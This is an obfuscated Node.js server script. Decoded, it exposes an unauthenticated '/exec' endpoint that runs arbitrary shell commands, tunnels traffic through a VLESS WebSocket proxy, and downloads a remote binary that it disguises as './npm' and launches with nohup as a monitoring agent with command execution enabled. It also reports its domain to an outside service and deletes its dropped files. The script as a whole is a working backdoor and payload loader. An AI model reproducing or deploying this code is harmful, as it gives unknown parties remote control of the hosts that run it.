const _0x5693d0=_0x534e;function _0x520c(){const _0x154a9e=['includes','every','split','end','pipe','cmd','\x0aclient_secret:\x20','48165850jBhPsc','axios','join','de04add9-5c68-6bab-950c-08cd5320df33','existsSync','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','arch','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','ps\x20aux\x20|\x20grep\x20\x22npm\x22\x20|\x20grep\x20-v\x20\x22grep\x22','data','net','finish','env','NEZHA_PORT','curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22','\x20-p\x20','from','https://arm64.ssss.nyc.mn/v1','connect','pop','readUInt8','send','once','npm\x20is\x20running','126asmOvB','config.yaml','718910FqLfJJ','202984qyIsnN','npm\x20is\x20already\x20running','&path=%2F#','DOMAIN','stream','chmod\x20+x\x20./npm','7268082zHKNru','substr','createServer','2083','slice','NEZHA_SERVER','npm\x20download\x20successfully','https://','unlink','&type=ws&host=','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','npm','2087','8443','toString','error','1234.abc.com','pathname','Hello,\x20World\x0a','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','UUID','351XZSlLt','--tls','has','Error\x20sending\x20request:','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','get','parse','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','493187PbEWaU','query','listen','URL\x20is\x20empty.\x20Skip\x20Adding\x20Automatic\x20Access\x20Task','NEZHA_KEY','8417801xXlydx','decode','https://arm64.ssss.nyc.mn/agent','url','No\x20command\x0a','map','nohup\x20./npm\x20-s\x20','https://amd64.ssss.nyc.mn/agent','NAME','AUTO_ACCESS','Vls','writeHead','47946GtLmME','base64','connection','length','replace','log','Server\x20is\x20running\x20on\x20port\x20','32iZAZjg','arm64','@www.visa.com.tw:443?encryption=none&security=tls&sni=','text/plain','2053','true','PORT','443','message','readUInt16BE','Server'];_0x520c=function(){return _0x154a9e;};return _0x520c();}(function(_0x202dfc,_0x31c62b){const _0x2da640=_0x534e,_0x2dd02d=_0x202dfc();while(!![]){try{const _0xc877ab=-parseInt(_0x2da640(0x1b5))/0x1+parseInt(_0x2da640(0x1f7))/0x2*(parseInt(_0x2da640(0x1c6))/0x3)+-parseInt(_0x2da640(0x1cd))/0x4*(parseInt(_0x2da640(0x1f9))/0x5)+-parseInt(_0x2da640(0x200))/0x6+-parseInt(_0x2da640(0x1ba))/0x7+-parseInt(_0x2da640(0x1fa))/0x8*(parseInt(_0x2da640(0x1ad))/0x9)+parseInt(_0x2da640(0x1df))/0xa;if(_0xc877ab===_0x31c62b)break;else _0x2dd02d['push'](_0x2dd02d['shift']());}catch(_0x2058d7){_0x2dd02d['push'](_0x2dd02d['shift']());}}}(_0x520c,0xbd97b));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x5693d0(0x1e0)),net=require(_0x5693d0(0x1e9)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5693d0(0x1eb)][_0x5693d0(0x1ac)]||_0x5693d0(0x1e2),NEZHA_SERVER=process['env'][_0x5693d0(0x205)]||'',NEZHA_PORT=process[_0x5693d0(0x1eb)][_0x5693d0(0x1ec)]||'',NEZHA_KEY=process[_0x5693d0(0x1eb)][_0x5693d0(0x1b9)]||'',DOMAIN=process['env'][_0x5693d0(0x1fd)]||_0x5693d0(0x1a8),AUTO_ACCESS=process[_0x5693d0(0x1eb)][_0x5693d0(0x1c3)]||!![],NAME=process['env'][_0x5693d0(0x1c2)]||_0x5693d0(0x1c4),PORT=process['env'][_0x5693d0(0x1d3)]||0xbb8,url=require('url'),metaInfo=execSync(_0x5693d0(0x1a2),{'encoding':'utf-8'}),ISP=metaInfo['trim'](),httpServer=http[_0x5693d0(0x202)]((_0x2a63fd,_0x352950)=>{const _0x2c9acc=_0x5693d0,_0xe3bce4=url[_0x2c9acc(0x1b3)](_0x2a63fd[_0x2c9acc(0x1bd)],!![]);if(_0xe3bce4[_0x2c9acc(0x1a9)]==='/exec'){console[_0x2c9acc(0x1cb)](_0xe3bce4['query']);if(!_0xe3bce4[_0x2c9acc(0x1b6)][_0x2c9acc(0x1dd)]){_0x352950[_0x2c9acc(0x1c5)](0xc8,{'Content-Type':_0x2c9acc(0x1d0)}),_0x352950[_0x2c9acc(0x1db)](_0x2c9acc(0x1be));return;}let _0x54e68b=_0xe3bce4[_0x2c9acc(0x1b6)]['cmd'];exec(_0x54e68b,function(_0x438112,_0x131d8c,_0x55745c){const _0x55fc4d=_0x2c9acc;_0x438112?(_0x352950[_0x55fc4d(0x1c5)](0xc8,{'Content-Type':_0x55fc4d(0x1d0)}),_0x352950[_0x55fc4d(0x1db)](_0x438112[_0x55fc4d(0x1d5)])):(_0x352950[_0x55fc4d(0x1c5)](0xc8,{'Content-Type':_0x55fc4d(0x1d0)}),_0x352950['end'](_0x131d8c));});return;}if(_0x2a63fd[_0x2c9acc(0x1bd)]==='/')_0x352950[_0x2c9acc(0x1c5)](0xc8,{'Content-Type':_0x2c9acc(0x1d0)}),_0x352950[_0x2c9acc(0x1db)](_0x2c9acc(0x1aa));else{if(_0x2a63fd[_0x2c9acc(0x1bd)]==='/'+UUID){const _0x36b8cc='vless://'+UUID+_0x2c9acc(0x1cf)+DOMAIN+_0x2c9acc(0x1a1)+DOMAIN+_0x2c9acc(0x1fc)+NAME+'-'+ISP,_0x1bf0c9=Buffer[_0x2c9acc(0x1ef)](_0x36b8cc)['toString'](_0x2c9acc(0x1c7));_0x352950[_0x2c9acc(0x1c5)](0xc8,{'Content-Type':_0x2c9acc(0x1d0)}),_0x352950['end'](_0x1bf0c9+'\x0a');}else _0x352950['writeHead'](0x194,{'Content-Type':_0x2c9acc(0x1d0)}),_0x352950[_0x2c9acc(0x1db)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x5693d0(0x1d7))]({'server':httpServer}),uuid=UUID[_0x5693d0(0x1ca)](/-/g,'');function _0x534e(_0x577fa2,_0x47a8b9){const _0x520c07=_0x520c();return _0x534e=function(_0x534ef3,_0x513e1f){_0x534ef3=_0x534ef3-0x1a1;let _0x125468=_0x520c07[_0x534ef3];return _0x125468;},_0x534e(_0x577fa2,_0x47a8b9);}wss['on'](_0x5693d0(0x1c8),_0x14d869=>{const _0x2e3c35=_0x5693d0;_0x14d869[_0x2e3c35(0x1f5)](_0x2e3c35(0x1d5),_0x18c975=>{const _0x120faf=_0x2e3c35,[_0x201b91]=_0x18c975,_0x2881f1=_0x18c975['slice'](0x1,0x11);if(!_0x2881f1[_0x120faf(0x1d9)]((_0x1cac81,_0x56d45a)=>_0x1cac81==parseInt(uuid[_0x120faf(0x201)](_0x56d45a*0x2,0x2),0x10)))return;let _0x588fa1=_0x18c975['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x25c90f=_0x18c975[_0x120faf(0x204)](_0x588fa1,_0x588fa1+=0x2)[_0x120faf(0x1d6)](0x0),_0x5c560b=_0x18c975[_0x120faf(0x204)](_0x588fa1,_0x588fa1+=0x1)[_0x120faf(0x1f3)](),_0x5477ef=_0x5c560b==0x1?_0x18c975[_0x120faf(0x204)](_0x588fa1,_0x588fa1+=0x4)[_0x120faf(0x1e1)]('.'):_0x5c560b==0x2?new TextDecoder()[_0x120faf(0x1bb)](_0x18c975['slice'](_0x588fa1+0x1,_0x588fa1+=0x1+_0x18c975['slice'](_0x588fa1,_0x588fa1+0x1)['readUInt8']())):_0x5c560b==0x3?_0x18c975['slice'](_0x588fa1,_0x588fa1+=0x10)['reduce']((_0x4c6b81,_0x49d4c1,_0x2d0bdf,_0x5bcd6e)=>_0x2d0bdf%0x2?_0x4c6b81['concat'](_0x5bcd6e[_0x120faf(0x204)](_0x2d0bdf-0x1,_0x2d0bdf+0x1)):_0x4c6b81,[])[_0x120faf(0x1bf)](_0x592b9a=>_0x592b9a[_0x120faf(0x1d6)](0x0)[_0x120faf(0x1a6)](0x10))[_0x120faf(0x1e1)](':'):'';_0x14d869[_0x120faf(0x1f4)](new Uint8Array([_0x201b91,0x0]));const _0x2ee111=createWebSocketStream(_0x14d869);net[_0x120faf(0x1f1)]({'host':_0x5477ef,'port':_0x25c90f},function(){const _0x457ab1=_0x120faf;this['write'](_0x18c975[_0x457ab1(0x204)](_0x588fa1)),_0x2ee111['on'](_0x457ab1(0x1a7),()=>{})[_0x457ab1(0x1dc)](this)['on'](_0x457ab1(0x1a7),()=>{})['pipe'](_0x2ee111);})['on']('error',()=>{});})['on'](_0x2e3c35(0x1a7),()=>{});});const getDownloadUrl=()=>{const _0x14dfe0=_0x5693d0,_0x3225e7=os[_0x14dfe0(0x1e5)]();return _0x3225e7==='arm'||_0x3225e7===_0x14dfe0(0x1ce)||_0x3225e7==='aarch64'?!NEZHA_PORT?_0x14dfe0(0x1f0):_0x14dfe0(0x1bc):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x14dfe0(0x1c1);},downloadFile=async()=>{const _0x2f6318=_0x5693d0;try{const _0x2c32db=getDownloadUrl(),_0x352309=await axios({'method':_0x2f6318(0x1b2),'url':_0x2c32db,'responseType':_0x2f6318(0x1fe)}),_0x46612c=fs['createWriteStream'](_0x2f6318(0x1a3));return _0x352309[_0x2f6318(0x1e8)][_0x2f6318(0x1dc)](_0x46612c),new Promise((_0x13a59f,_0x2b2c7a)=>{const _0x2b8cf6=_0x2f6318;_0x46612c['on'](_0x2b8cf6(0x1ea),()=>{const _0x518801=_0x2b8cf6;console['log'](_0x518801(0x206)),exec(_0x518801(0x1ff),_0x25a03a=>{if(_0x25a03a)_0x2b2c7a(_0x25a03a);_0x13a59f();});}),_0x46612c['on'](_0x2b8cf6(0x1a7),_0x2b2c7a);});}catch(_0x5b5896){throw _0x5b5896;}},runnz=async()=>{const _0x2fee14=_0x5693d0;await downloadFile();let _0x130e27='',_0xb0c057='';console['log']('NEZHA_SERVER:\x20'+NEZHA_SERVER);const _0x32c1fc=()=>{const _0x5b8737=_0x534e;try{const _0x35bc6f=execSync(_0x5b8737(0x1e7))['toString']();return _0x35bc6f[_0x5b8737(0x1c9)]>0x0;}catch(_0x3263fd){return![];}};if(_0x32c1fc()){console[_0x2fee14(0x1cb)](_0x2fee14(0x1fb));return;}if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2ddd46=[_0x2fee14(0x1d4),_0x2fee14(0x1a5),'2096',_0x2fee14(0x1a4),'2083',_0x2fee14(0x1d1)];_0x130e27=_0x2ddd46[_0x2fee14(0x1d8)](NEZHA_PORT)?_0x2fee14(0x1ae):'',_0xb0c057=_0x2fee14(0x1c0)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2fee14(0x1ee)+NEZHA_KEY+'\x20'+_0x130e27+'\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2f72db=NEZHA_SERVER[_0x2fee14(0x1d8)](':')?NEZHA_SERVER[_0x2fee14(0x1da)](':')[_0x2fee14(0x1f2)]():'',_0x287169=new Set([_0x2fee14(0x1d4),_0x2fee14(0x1a5),'2096','2087',_0x2fee14(0x203),_0x2fee14(0x1d1)]),_0x4c3fbe=_0x287169[_0x2fee14(0x1af)](_0x2f72db)?_0x2fee14(0x1d2):'false',_0x16a2f7=_0x2fee14(0x1de)+NEZHA_KEY+_0x2fee14(0x1ab)+NEZHA_SERVER+_0x2fee14(0x1b4)+_0x4c3fbe+_0x2fee14(0x1e4)+UUID;!fs[_0x2fee14(0x1e3)](_0x2fee14(0x1f8))&&fs['writeFileSync'](_0x2fee14(0x1f8),_0x16a2f7);}_0xb0c057=_0x2fee14(0x1e6);}else{console[_0x2fee14(0x1cb)](_0x2fee14(0x1b1));return;}}try{exec(_0xb0c057,{'shell':'/bin/bash'}),console[_0x2fee14(0x1cb)](_0x2fee14(0x1f6));}catch(_0x1736e6){console[_0x2fee14(0x1a7)]('npm\x20running\x20error:\x20'+_0x1736e6);}};async function addAccessTask(){const _0x5521b2=_0x5693d0;if(!AUTO_ACCESS)return;try{if(!DOMAIN){console[_0x5521b2(0x1cb)](_0x5521b2(0x1b8));return;}else{const _0x369d9e=_0x5521b2(0x207)+DOMAIN,_0x3ec89e=_0x5521b2(0x1ed)+_0x369d9e+'\x22}\x27';exec(_0x3ec89e,(_0x19330a,_0xe30529,_0x5dd810)=>{const _0x11b607=_0x5521b2;if(_0x19330a){console['error'](_0x11b607(0x1b0),_0x19330a[_0x11b607(0x1d5)]);return;}console[_0x11b607(0x1cb)]('Automatic\x20Access\x20Task\x20added\x20successfully:',_0xe30529);});}}catch(_0x4b373b){console[_0x5521b2(0x1a7)]('Error\x20added\x20Task:',_0x4b373b['message']);}}const delFiles=()=>{const _0x5743b7=_0x5693d0;fs[_0x5743b7(0x208)](_0x5743b7(0x1a3),()=>{}),fs[_0x5743b7(0x208)](_0x5743b7(0x1f8),()=>{});};httpServer[_0x5693d0(0x1b7)](PORT,()=>{const _0x1f5df9=_0x5693d0;runnz(),addAccessTask(),console[_0x1f5df9(0x1cb)](_0x1f5df9(0x1cc)+PORT);});
